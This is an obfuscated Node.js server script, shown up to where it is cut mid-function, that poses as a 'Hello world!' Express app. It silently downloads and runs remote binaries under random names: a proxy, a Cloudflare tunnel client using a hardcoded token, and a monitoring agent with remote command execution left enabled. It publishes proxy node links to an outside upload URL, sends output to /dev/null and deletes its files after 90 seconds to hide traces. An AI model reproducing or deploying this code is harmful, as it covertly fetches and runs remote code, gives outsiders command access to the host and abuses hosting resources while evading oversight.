const _0x2b2aaf=_0x629d;(function(_0x461c3b,_0x50809d){const _0x11dcff=_0x629d,_0x22bfe5=_0x461c3b();while(!![]){try{const _0x2ee6f3=parseInt(_0x11dcff(0xb3))/0x1+parseInt(_0x11dcff(0x113))/0x2+parseInt(_0x11dcff(0xa0))/0x3+parseInt(_0x11dcff(0xee))/0x4*(parseInt(_0x11dcff(0x128))/0x5)+parseInt(_0x11dcff(0x93))/0x6*(parseInt(_0x11dcff(0x130))/0x7)+-parseInt(_0x11dcff(0x98))/0x8*(-parseInt(_0x11dcff(0x73))/0x9)+parseInt(_0x11dcff(0x8d))/0xa*(-parseInt(_0x11dcff(0xb6))/0xb);if(_0x2ee6f3===_0x50809d)break;else _0x22bfe5['push'](_0x22bfe5['shift']());}catch(_0x8b8176){_0x22bfe5['push'](_0x22bfe5['shift']());}}}(_0xf7ec,0x56daf));function _0xf7ec(){const _0x31507b=['from','458410AdsFtA','join','https://amd64.ssss.nyc.mn/v1','aarch64','post','UUID','get','taskkill\x20/f\x20/im\x20','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','443','sub','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','set','fileUrl','push','ARGO_AUTH','Error\x20reading\x20boot.log:','unshift','readFileSync','message','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','1406030cWHFlJ','finish','map','http://ip-api.com/json/','error','then','php\x20running\x20error:\x20','http\x20server\x20is\x20running\x20on\x20port:','49oFqlvN','https://arm64.ssss.nyc.mn/web','&fp=firefox&type=ws&host=','application/json','./tmp','quic','2053','createWriteStream','Error\x20executing\x20command:\x20','Error\x20in\x20startserver:','chmod','Download\x20','338841XAXVcD','/trojan-argo','eyJhIjoiZGIyM2RjMzI5ZDlhZDBkOTM2MWE2NGFlZmM0OGE1YWYiLCJ0IjoiYmVkMTZmZGUtZTczOS00MGI1LTliZDQtODc3NGJmNGY5YTBlIiwicyI6IlltVmtORE0wWTJZdE9UTmhPQzAwWkRSaUxUazBOalF0TjJZME1HWmhNR1kyTkRSbSJ9','AUTO_ACCESS','rm\x20-rf\x20','/tunnel.yml\x20run','Skipping\x20adding\x20automatic\x20access\x20task','send','TunnelSecret','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','\x20-c\x20','ARGO_DOMAIN:','fileName','clear','freedom','boot.log','axios','response','FILE_PATH','\x20already\x20exists','NEZHA_KEY','listen','.exe\x20>\x20nul\x202>&1','win32','8443','Unknown','21410JUvLpa','has','NAME','arm','nohup\x20','text/plain;\x20charset=utf-8','180402BtcbNy','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','UPLOAD_URL','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','test','8QyVoYP','tunnel.yml','toString','split','?security=tls&sni=','util','countryCode','stringify','1096551kWcxwG','utf-8','\x0avless://','filter','none','writeFileSync','statSync','/vmess-argo?ed=2560','mkdirSync','2087','Content-Type','/sub.txt\x20saved\x20successfully','arch','Empowerment\x20success\x20for\x20','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','NEZHA_SERVER','https://oooo.serv00.net/add-url','Empowerment\x20failed\x20for\x20','sub.txt','411404qhxTug','\x20failed:\x20','/api/add-nodes','6061mwRjCU','\x22\x20>\x20/dev/null\x202>&1','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','ARGO_DOMAIN','org','ArgoDomain:','existsSync','/api/delete-nodes','basename','\x20is\x20running','Hello\x20world!','\x0a\x20\x20\x20\x20','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','PORT','floor','http','base64','config.json','CFIP','127.0.0.1','status','NEZHA_PORT','path','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','Nodes\x20uploaded\x20successfully','NEZHA\x20variable\x20is\x20empty,skip\x20running','pkill\x20-f\x20\x22[','true','child_process','isFile','--tls','SERVER_PORT','https://amd64.ssss.nyc.mn/bot','fengye','forEach','SUB_PATH','https://arm64.ssss.nyc.mn/bot','/vless-argo','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','\x0a\x0atrojan://','\x0aclient_secret:\x20','stream','App\x20is\x20running','includes','&path=%2Ftrojan-argo%3Fed%3D2560#','PROJECT_URL','data','npm\x20running\x20error:\x20','charAt','block','tcp','firefox','exec','ARGO_PORT','vpn.coinweth1.dpdns.org','substring','4sKcRgX','success','/vmess-argo','vless','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','&path=%2Fvless-argo%3Fed%3D2560#','\x20>/dev/null\x202>&1','log','all','length','country_code','\x0a\x0avmess://','CFPORT','catch','config.yaml','\x20is\x20created','automatic\x20access\x20task\x20added\x20successfully','2096','\x20>/dev/null\x202>&1\x20&','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','/api/add-subscriptions','Error\x20downloading\x20files:','amd','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','unlinkSync','https://arm64.ssss.nyc.mn/agent','tls','direct','arm64','env','Unhandled\x20error\x20in\x20startserver:','list.txt','\x0a\x20\x20tunnel:\x20','\x20>\x20nul\x202>&1','2083','random'];_0xf7ec=function(){return _0x31507b;};return _0xf7ec();}const express=require('express'),app=express(),axios=require(_0x2b2aaf(0x83)),os=require('os'),fs=require('fs'),path=require(_0x2b2aaf(0xcc)),{promisify}=require(_0x2b2aaf(0x9d)),exec=promisify(require(_0x2b2aaf(0xd2))[_0x2b2aaf(0xea)]),{execSync}=require(_0x2b2aaf(0xd2)),UPLOAD_URL=process[_0x2b2aaf(0x10b)][_0x2b2aaf(0x95)]||'',PROJECT_URL=process['env'][_0x2b2aaf(0xe3)]||'',AUTO_ACCESS=process[_0x2b2aaf(0x10b)][_0x2b2aaf(0x76)]||![],FILE_PATH=process[_0x2b2aaf(0x10b)][_0x2b2aaf(0x85)]||_0x2b2aaf(0x134),SUB_PATH=process['env'][_0x2b2aaf(0xd9)]||_0x2b2aaf(0x11d),PORT=process[_0x2b2aaf(0x10b)][_0x2b2aaf(0xd5)]||process['env'][_0x2b2aaf(0xc3)]||0xbb8,UUID=process[_0x2b2aaf(0x10b)][_0x2b2aaf(0x118)]||'f17f7c0d-c865-4ba6-a464-1b8046bae8bc',NEZHA_SERVER=process[_0x2b2aaf(0x10b)][_0x2b2aaf(0xaf)]||'',NEZHA_PORT=process[_0x2b2aaf(0x10b)][_0x2b2aaf(0xcb)]||'',NEZHA_KEY=process[_0x2b2aaf(0x10b)][_0x2b2aaf(0x87)]||'',ARGO_DOMAIN=process[_0x2b2aaf(0x10b)][_0x2b2aaf(0xb9)]||_0x2b2aaf(0xec),ARGO_AUTH=process[_0x2b2aaf(0x10b)][_0x2b2aaf(0x122)]||_0x2b2aaf(0x75),ARGO_PORT=process[_0x2b2aaf(0x10b)][_0x2b2aaf(0xeb)]||0x1f41,CFIP=process['env'][_0x2b2aaf(0xc8)]||'cdns.doon.eu.org',CFPORT=process[_0x2b2aaf(0x10b)][_0x2b2aaf(0xfa)]||0x1bb,NAME=process['env'][_0x2b2aaf(0x8f)]||_0x2b2aaf(0xd7);!fs[_0x2b2aaf(0xbc)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x2b2aaf(0xf5)](FILE_PATH+_0x2b2aaf(0xfd))):console['log'](FILE_PATH+_0x2b2aaf(0x86));function generateRandomName(){const _0x35df91=_0x2b2aaf,_0x182970='abcdefghijklmnopqrstuvwxyz';let _0x4c366c='';for(let _0x52bd63=0x0;_0x52bd63<0x6;_0x52bd63++){_0x4c366c+=_0x182970['charAt'](Math[_0x35df91(0xc4)](Math[_0x35df91(0x111)]()*_0x182970[_0x35df91(0xf7)]));}return _0x4c366c;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x2b2aaf(0x114)](FILE_PATH,npmName),phpPath=path[_0x2b2aaf(0x114)](FILE_PATH,phpName),webPath=path[_0x2b2aaf(0x114)](FILE_PATH,webName),botPath=path[_0x2b2aaf(0x114)](FILE_PATH,botName),subPath=path[_0x2b2aaf(0x114)](FILE_PATH,_0x2b2aaf(0xb2)),listPath=path['join'](FILE_PATH,_0x2b2aaf(0x10d)),bootLogPath=path['join'](FILE_PATH,_0x2b2aaf(0x82)),configPath=path[_0x2b2aaf(0x114)](FILE_PATH,_0x2b2aaf(0xc7));function deleteNodes(){const _0x43e100=_0x2b2aaf;try{if(!UPLOAD_URL)return;if(!fs[_0x43e100(0xbc)](subPath))return;let _0x47cb55;try{_0x47cb55=fs[_0x43e100(0x125)](subPath,_0x43e100(0xa1));}catch{return null;}const _0x50892a=Buffer[_0x43e100(0x112)](_0x47cb55,_0x43e100(0xc6))[_0x43e100(0x9a)](_0x43e100(0xa1)),_0x5b285f=_0x50892a[_0x43e100(0x9b)]('\x0a')[_0x43e100(0xa3)](_0x5922fe=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x5922fe));if(_0x5b285f[_0x43e100(0xf7)]===0x0)return;return axios[_0x43e100(0x117)](UPLOAD_URL+_0x43e100(0xbd),JSON[_0x43e100(0x9f)]({'nodes':_0x5b285f}),{'headers':{'Content-Type':_0x43e100(0x133)}})[_0x43e100(0xfb)](_0x30caad=>{return null;}),null;}catch(_0x109559){return null;}}function cleanupOldFiles(){try{const _0x18783b=fs['readdirSync'](FILE_PATH);_0x18783b['forEach'](_0x347be4=>{const _0x1594f6=_0x629d,_0x46dae0=path[_0x1594f6(0x114)](FILE_PATH,_0x347be4);try{const _0x180bb3=fs[_0x1594f6(0xa6)](_0x46dae0);_0x180bb3[_0x1594f6(0xd3)]()&&fs['unlinkSync'](_0x46dae0);}catch(_0x33450f){}});}catch(_0x4dc22d){}}app[_0x2b2aaf(0x119)]('/',function(_0x451635,_0x744a95){const _0x1ceea3=_0x2b2aaf;_0x744a95[_0x1ceea3(0x7a)](_0x1ceea3(0xc0));});async function generateConfig(){const _0x1351a9=_0x2b2aaf,_0x536a4f={'log':{'access':'/dev/null','error':'/dev/null','loglevel':_0x1351a9(0xa4)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x1351a9(0xf1),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x1351a9(0xa4),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x1351a9(0xe8)}},{'port':0xbb9,'listen':_0x1351a9(0xc9),'protocol':_0x1351a9(0xf1),'settings':{'clients':[{'id':UUID}],'decryption':_0x1351a9(0xa4)},'streamSettings':{'network':_0x1351a9(0xe8),'security':_0x1351a9(0xa4)}},{'port':0xbba,'listen':_0x1351a9(0xc9),'protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x1351a9(0xa4)},'streamSettings':{'network':'ws','security':_0x1351a9(0xa4),'wsSettings':{'path':_0x1351a9(0xdb)}},'sniffing':{'enabled':!![],'destOverride':[_0x1351a9(0xc5),_0x1351a9(0x108),_0x1351a9(0x6c)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x1351a9(0xc9),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x1351a9(0xf0)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x1351a9(0x108),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x1351a9(0xc9),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x1351a9(0xa4),'wsSettings':{'path':_0x1351a9(0x74)}},'sniffing':{'enabled':!![],'destOverride':[_0x1351a9(0xc5),_0x1351a9(0x108),_0x1351a9(0x6c)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x1351a9(0x81),'tag':_0x1351a9(0x109)},{'protocol':'blackhole','tag':_0x1351a9(0xe7)}]};fs[_0x1351a9(0xa5)](path[_0x1351a9(0x114)](FILE_PATH,_0x1351a9(0xc7)),JSON[_0x1351a9(0x9f)](_0x536a4f,null,0x2));}function getSystemArchitecture(){const _0x424dae=_0x2b2aaf,_0x2ca8a3=os[_0x424dae(0xac)]();return _0x2ca8a3===_0x424dae(0x90)||_0x2ca8a3===_0x424dae(0x10a)||_0x2ca8a3===_0x424dae(0x116)?_0x424dae(0x90):_0x424dae(0x104);}function downloadFile(_0x34e0ed,_0x14a1d0,_0x78737f){const _0x2f08d8=_0x2b2aaf,_0x3680b1=_0x34e0ed;!fs[_0x2f08d8(0xbc)](FILE_PATH)&&fs[_0x2f08d8(0xa8)](FILE_PATH,{'recursive':!![]});const _0x386d45=fs[_0x2f08d8(0x6e)](_0x3680b1);axios({'method':_0x2f08d8(0x119),'url':_0x14a1d0,'responseType':_0x2f08d8(0xdf)})[_0x2f08d8(0x12d)](_0x19369a=>{const _0x35556c=_0x2f08d8;_0x19369a[_0x35556c(0xe4)]['pipe'](_0x386d45),_0x386d45['on'](_0x35556c(0x129),()=>{const _0xec0347=_0x35556c;_0x386d45['close'](),console['log']('Download\x20'+path[_0xec0347(0xbe)](_0x3680b1)+'\x20successfully'),_0x78737f(null,_0x3680b1);}),_0x386d45['on'](_0x35556c(0x12c),_0x42d615=>{const _0x82e741=_0x35556c;fs['unlink'](_0x3680b1,()=>{});const _0x13d483=_0x82e741(0x72)+path[_0x82e741(0xbe)](_0x3680b1)+_0x82e741(0xb4)+_0x42d615['message'];console[_0x82e741(0x12c)](_0x13d483),_0x78737f(_0x13d483);});})['catch'](_0x3da206=>{const _0x42e3e3=_0x2f08d8,_0x290bec=_0x42e3e3(0x72)+path['basename'](_0x3680b1)+'\x20failed:\x20'+_0x3da206[_0x42e3e3(0x126)];console[_0x42e3e3(0x12c)](_0x290bec),_0x78737f(_0x290bec);});}async function downloadFilesAndRun(){const _0x5530f7=_0x2b2aaf,_0x3676ad=getSystemArchitecture(),_0x20cecf=getFilesForArchitecture(_0x3676ad);if(_0x20cecf[_0x5530f7(0xf7)]===0x0){console[_0x5530f7(0xf5)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x27b455=_0x20cecf[_0x5530f7(0x12a)](_0x4a394b=>{return new Promise((_0x591f41,_0x5d2c42)=>{const _0x4091fc=_0x629d;downloadFile(_0x4a394b[_0x4091fc(0x7f)],_0x4a394b[_0x4091fc(0x120)],(_0x59d7ef,_0x1c1c04)=>{_0x59d7ef?_0x5d2c42(_0x59d7ef):_0x591f41(_0x1c1c04);});});});try{await Promise[_0x5530f7(0xf6)](_0x27b455);}catch(_0xe5a63c){console['error'](_0x5530f7(0x103),_0xe5a63c);return;}function _0x2af46e(_0x4e6166){const _0x43c645=_0x5530f7,_0x3530f9=0x1fd;_0x4e6166[_0x43c645(0xd8)](_0x18b488=>{const _0x197eff=_0x43c645;fs[_0x197eff(0xbc)](_0x18b488)&&fs[_0x197eff(0x71)](_0x18b488,_0x3530f9,_0x8d306a=>{const _0x5641c3=_0x197eff;_0x8d306a?console[_0x5641c3(0x12c)](_0x5641c3(0xb1)+_0x18b488+':\x20'+_0x8d306a):console[_0x5641c3(0xf5)](_0x5641c3(0xad)+_0x18b488+':\x20'+_0x3530f9[_0x5641c3(0x9a)](0x8));});});}const _0xbd3a86=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x2af46e(_0xbd3a86);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x864754=NEZHA_SERVER[_0x5530f7(0xe1)](':')?NEZHA_SERVER[_0x5530f7(0x9b)](':')['pop']():'',_0x2ad18f=new Set([_0x5530f7(0x11c),_0x5530f7(0x8b),_0x5530f7(0xff),_0x5530f7(0xa9),_0x5530f7(0x110),_0x5530f7(0x6d)]),_0xcc281=_0x2ad18f[_0x5530f7(0x8e)](_0x864754)?_0x5530f7(0xd1):'false',_0x19f2d3=_0x5530f7(0xde)+NEZHA_KEY+_0x5530f7(0x96)+NEZHA_SERVER+_0x5530f7(0xb8)+_0xcc281+_0x5530f7(0xcd)+UUID;fs[_0x5530f7(0xa5)](path[_0x5530f7(0x114)](FILE_PATH,_0x5530f7(0xfc)),_0x19f2d3);const _0x260d9e='nohup\x20'+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0x5530f7(0x11e);try{await exec(_0x260d9e),console[_0x5530f7(0xf5)](phpName+_0x5530f7(0xbf)),await new Promise(_0x5ee3c1=>setTimeout(_0x5ee3c1,0x3e8));}catch(_0x59f752){console[_0x5530f7(0x12c)](_0x5530f7(0x12e)+_0x59f752);}}else{let _0x533500='';const _0x509709=[_0x5530f7(0x11c),_0x5530f7(0x8b),_0x5530f7(0xff),_0x5530f7(0xa9),'2083',_0x5530f7(0x6d)];_0x509709[_0x5530f7(0xe1)](NEZHA_PORT)&&(_0x533500=_0x5530f7(0xd4));const _0x513bc8=_0x5530f7(0x91)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x533500+_0x5530f7(0x11b);try{await exec(_0x513bc8),console[_0x5530f7(0xf5)](npmName+_0x5530f7(0xbf)),await new Promise(_0x518b09=>setTimeout(_0x518b09,0x3e8));}catch(_0x470583){console[_0x5530f7(0x12c)](_0x5530f7(0xe5)+_0x470583);}}}else console[_0x5530f7(0xf5)](_0x5530f7(0xcf));const _0x294697=_0x5530f7(0x91)+webPath+_0x5530f7(0x7d)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x294697),console[_0x5530f7(0xf5)](webName+_0x5530f7(0xbf)),await new Promise(_0x542a24=>setTimeout(_0x542a24,0x3e8));}catch(_0x4017d7){console[_0x5530f7(0x12c)]('web\x20running\x20error:\x20'+_0x4017d7);}if(fs[_0x5530f7(0xbc)](botPath)){let _0x4b35fc;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x4b35fc='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x4b35fc='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x5530f7(0x78):_0x4b35fc='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x5530f7(0x105)+ARGO_PORT;try{await exec(_0x5530f7(0x91)+botPath+'\x20'+_0x4b35fc+_0x5530f7(0x100)),console['log'](botName+_0x5530f7(0xbf)),await new Promise(_0x5b7102=>setTimeout(_0x5b7102,0x7d0));}catch(_0x446a17){console[_0x5530f7(0x12c)](_0x5530f7(0x6f)+_0x446a17);}}await new Promise(_0x1ed7fb=>setTimeout(_0x1ed7fb,0x1388));}function getFilesForArchitecture(_0x948712){const _0x3b21f9=_0x2b2aaf;let _0x3cc232;_0x948712===_0x3b21f9(0x90)?_0x3cc232=[{'fileName':webPath,'fileUrl':_0x3b21f9(0x131)},{'fileName':botPath,'fileUrl':_0x3b21f9(0xda)}]:_0x3cc232=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x3b21f9(0xd6)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x4d9a01=_0x948712===_0x3b21f9(0x90)?_0x3b21f9(0x107):'https://amd64.ssss.nyc.mn/agent';_0x3cc232[_0x3b21f9(0x124)]({'fileName':npmPath,'fileUrl':_0x4d9a01});}else{const _0x531a9d=_0x948712===_0x3b21f9(0x90)?'https://arm64.ssss.nyc.mn/v1':_0x3b21f9(0x115);_0x3cc232[_0x3b21f9(0x124)]({'fileName':phpPath,'fileUrl':_0x531a9d});}}return _0x3cc232;}function argoType(){const _0x1ae948=_0x2b2aaf;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0x1ae948(0x7c));return;}if(ARGO_AUTH[_0x1ae948(0xe1)](_0x1ae948(0x7b))){fs[_0x1ae948(0xa5)](path['join'](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x1cdc92=_0x1ae948(0x10e)+ARGO_AUTH['split']('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path['join'](FILE_PATH,'tunnel.json')+_0x1ae948(0x101)+ARGO_DOMAIN+_0x1ae948(0x127)+ARGO_PORT+_0x1ae948(0x94);fs[_0x1ae948(0xa5)](path[_0x1ae948(0x114)](FILE_PATH,_0x1ae948(0x99)),_0x1cdc92);}else console[_0x1ae948(0xf5)](_0x1ae948(0xc2));}async function extractDomains(){const _0x237f0f=_0x2b2aaf;let _0xa73c57;if(ARGO_AUTH&&ARGO_DOMAIN)_0xa73c57=ARGO_DOMAIN,console[_0x237f0f(0xf5)](_0x237f0f(0x7e),_0xa73c57),await _0x133c2f(_0xa73c57);else try{const _0x5f5664=fs[_0x237f0f(0x125)](path[_0x237f0f(0x114)](FILE_PATH,_0x237f0f(0x82)),_0x237f0f(0xa1)),_0x334244=_0x5f5664[_0x237f0f(0x9b)]('\x0a'),_0x894b77=[];_0x334244['forEach'](_0x56fcb8=>{const _0x1f06f2=_0x237f0f,_0x5a38c4=_0x56fcb8['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x5a38c4){const _0x5b6818=_0x5a38c4[0x1];_0x894b77[_0x1f06f2(0x121)](_0x5b6818);}});if(_0x894b77[_0x237f0f(0xf7)]>0x0)_0xa73c57=_0x894b77[0x0],console[_0x237f0f(0xf5)](_0x237f0f(0xbb),_0xa73c57),await _0x133c2f(_0xa73c57);else{console[_0x237f0f(0xf5)](_0x237f0f(0xae)),fs[_0x237f0f(0x106)](path[_0x237f0f(0x114)](FILE_PATH,_0x237f0f(0x82)));async function _0x6e7a9f(){const _0x2c626b=_0x237f0f;try{process['platform']===_0x2c626b(0x8a)?await exec(_0x2c626b(0x11a)+botName+_0x2c626b(0x89)):await exec(_0x2c626b(0xd0)+botName[_0x2c626b(0xe6)](0x0)+']'+botName[_0x2c626b(0xed)](0x1)+_0x2c626b(0xb7));}catch(_0x391562){}}_0x6e7a9f(),await new Promise(_0x5a6765=>setTimeout(_0x5a6765,0xbb8));const _0x2f4bb5=_0x237f0f(0xdc)+FILE_PATH+_0x237f0f(0x105)+ARGO_PORT;try{await exec(_0x237f0f(0x91)+botPath+'\x20'+_0x2f4bb5+_0x237f0f(0x100)),console['log'](botName+_0x237f0f(0xbf)),await new Promise(_0x5ea516=>setTimeout(_0x5ea516,0xbb8)),await extractDomains();}catch(_0x26dc85){console[_0x237f0f(0x12c)](_0x237f0f(0x6f)+_0x26dc85);}}}catch(_0x53c87d){console[_0x237f0f(0x12c)](_0x237f0f(0x123),_0x53c87d);}async function _0x446eee(){const _0x2ef6bf=_0x237f0f;try{const _0x50202f=await axios[_0x2ef6bf(0x119)]('https://ipapi.co/json/',{'timeout':0xbb8});if(_0x50202f[_0x2ef6bf(0xe4)]&&_0x50202f['data'][_0x2ef6bf(0xf8)]&&_0x50202f[_0x2ef6bf(0xe4)][_0x2ef6bf(0xba)])return _0x50202f[_0x2ef6bf(0xe4)][_0x2ef6bf(0xf8)]+'_'+_0x50202f[_0x2ef6bf(0xe4)][_0x2ef6bf(0xba)];}catch(_0x1e5c83){try{const _0x52a511=await axios[_0x2ef6bf(0x119)](_0x2ef6bf(0x12b),{'timeout':0xbb8});if(_0x52a511[_0x2ef6bf(0xe4)]&&_0x52a511[_0x2ef6bf(0xe4)]['status']===_0x2ef6bf(0xef)&&_0x52a511[_0x2ef6bf(0xe4)]['countryCode']&&_0x52a511['data'][_0x2ef6bf(0xba)])return _0x52a511[_0x2ef6bf(0xe4)][_0x2ef6bf(0x9e)]+'_'+_0x52a511['data'][_0x2ef6bf(0xba)];}catch(_0xa3c377){}}return _0x2ef6bf(0x8c);}async function _0x133c2f(_0x1cf73a){const _0x248c0b=await _0x446eee(),_0x2b552e=NAME?NAME+'-'+_0x248c0b:_0x248c0b;return new Promise(_0x2e6007=>{setTimeout(()=>{const _0x1b0f7d=_0x629d,_0x23229a={'v':'2','ps':''+_0x2b552e,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x1b0f7d(0xa4),'net':'ws','type':_0x1b0f7d(0xa4),'host':_0x1cf73a,'path':_0x1b0f7d(0xa7),'tls':_0x1b0f7d(0x108),'sni':_0x1cf73a,'alpn':'','fp':_0x1b0f7d(0xe9)},_0x109b60=_0x1b0f7d(0xa2)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x1cf73a+_0x1b0f7d(0x132)+_0x1cf73a+_0x1b0f7d(0xf3)+_0x2b552e+_0x1b0f7d(0xf9)+Buffer[_0x1b0f7d(0x112)](JSON[_0x1b0f7d(0x9f)](_0x23229a))[_0x1b0f7d(0x9a)]('base64')+_0x1b0f7d(0xdd)+UUID+'@'+CFIP+':'+CFPORT+_0x1b0f7d(0x9c)+_0x1cf73a+'&fp=firefox&type=ws&host='+_0x1cf73a+_0x1b0f7d(0xe2)+_0x2b552e+_0x1b0f7d(0xc1);console[_0x1b0f7d(0xf5)](Buffer[_0x1b0f7d(0x112)](_0x109b60)[_0x1b0f7d(0x9a)](_0x1b0f7d(0xc6))),fs[_0x1b0f7d(0xa5)](subPath,Buffer[_0x1b0f7d(0x112)](_0x109b60)[_0x1b0f7d(0x9a)](_0x1b0f7d(0xc6))),console['log'](FILE_PATH+_0x1b0f7d(0xab)),uploadNodes(),app[_0x1b0f7d(0x119)]('/'+SUB_PATH,(_0x4e6061,_0xf9d8a2)=>{const _0x3f0aa6=_0x1b0f7d,_0x37fae5=Buffer['from'](_0x109b60)['toString']('base64');_0xf9d8a2[_0x3f0aa6(0x11f)](_0x3f0aa6(0xaa),_0x3f0aa6(0x92)),_0xf9d8a2['send'](_0x37fae5);}),_0x2e6007(_0x109b60);},0x7d0);});}}async function uploadNodes(){const _0x1ba458=_0x2b2aaf;if(UPLOAD_URL&&PROJECT_URL){const _0xf9cf99=PROJECT_URL+'/'+SUB_PATH,_0x3f838b={'subscription':[_0xf9cf99]};try{const _0x435e2c=await axios['post'](UPLOAD_URL+_0x1ba458(0x102),_0x3f838b,{'headers':{'Content-Type':'application/json'}});return _0x435e2c&&_0x435e2c['status']===0xc8?(console[_0x1ba458(0xf5)]('Subscription\x20uploaded\x20successfully'),_0x435e2c):null;}catch(_0x2ef47b){if(_0x2ef47b[_0x1ba458(0x84)]){if(_0x2ef47b['response'][_0x1ba458(0xca)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x1ba458(0xbc)](listPath))return;const _0x4a8eab=fs[_0x1ba458(0x125)](listPath,_0x1ba458(0xa1)),_0x4f6126=_0x4a8eab[_0x1ba458(0x9b)]('\x0a')[_0x1ba458(0xa3)](_0x4887a2=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x1ba458(0x97)](_0x4887a2));if(_0x4f6126[_0x1ba458(0xf7)]===0x0)return;const _0x567a59=JSON[_0x1ba458(0x9f)]({'nodes':_0x4f6126});try{const _0x20f225=await axios[_0x1ba458(0x117)](UPLOAD_URL+_0x1ba458(0xb5),_0x567a59,{'headers':{'Content-Type':_0x1ba458(0x133)}});return _0x20f225&&_0x20f225['status']===0xc8?(console[_0x1ba458(0xf5)](_0x1ba458(0xce)),_0x20f225):null;}catch(_0x5904c6){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x325cc4=_0x629d,_0x3b6bfb=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x3b6bfb['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x3b6bfb['push'](phpPath);process['platform']==='win32'?exec('del\x20/f\x20/q\x20'+_0x3b6bfb[_0x325cc4(0x114)]('\x20')+_0x325cc4(0x10f),_0x31d1b7=>{const _0x19a9df=_0x325cc4;console[_0x19a9df(0x80)](),console[_0x19a9df(0xf5)](_0x19a9df(0xe0)),console['log'](_0x19a9df(0xf2));}):exec(_0x325cc4(0x77)+_0x3b6bfb[_0x325cc4(0x114)]('\x20')+_0x325cc4(0xf4),_0xc198bd=>{const _0x3d7620=_0x325cc4;console[_0x3d7620(0x80)](),console[_0x3d7620(0xf5)](_0x3d7620(0xe0)),console[_0x3d7620(0xf5)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}function _0x629d(_0x455b6d,_0x4734ac){_0x455b6d=_0x455b6d-0x6c;const _0xf7eca6=_0xf7ec();let _0x629d46=_0xf7eca6[_0x455b6d];return _0x629d46;}cleanFiles();async function AddVisitTask(){const _0x24d3b2=_0x2b2aaf;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x24d3b2(0xf5)](_0x24d3b2(0x79));return;}try{const _0x6c5708=await 